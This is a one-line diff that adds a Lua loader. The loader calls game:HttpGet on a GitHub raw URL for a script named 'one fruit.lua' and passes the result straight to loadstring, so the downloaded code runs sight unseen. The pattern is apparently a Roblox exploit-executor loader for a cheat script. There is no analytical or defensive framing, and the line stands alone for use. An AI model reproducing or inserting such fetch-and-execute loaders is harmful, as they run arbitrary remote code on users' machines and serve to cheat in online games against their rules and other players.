@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Synfenzo/scripts/main/one%20fruit.lua"))()
